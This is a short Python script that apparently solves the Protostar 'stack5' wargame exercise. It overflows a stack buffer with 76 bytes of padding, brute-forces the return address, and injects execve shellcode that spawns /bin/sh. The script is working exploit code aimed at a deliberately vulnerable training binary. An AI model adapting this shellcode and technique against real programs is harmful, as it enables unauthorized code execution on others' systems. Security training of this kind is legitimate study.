import struct
import os

padding = "A"*76
eip = 0xbffff6ec+4
shellcode = "\x90"*0 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

#with open("test.txt", "w") as f:
for i in range(0, 0x90):
                f = open("test.txt","w")
                this_eip = eip + i*4
                pack_eip = struct.pack("I", this_eip)
                f.write(padding+pack_eip+shellcode+b'\n')
                f.close() # close file before cat or else it wont print out result
                print "[*] EIP: {0} ".format(hex(this_eip))
                out_ = os.popen("(cat test.txt ; echo id ) | /opt/protostar/bin/stack5").read()
                if len(out_):
                        print out_
                        break

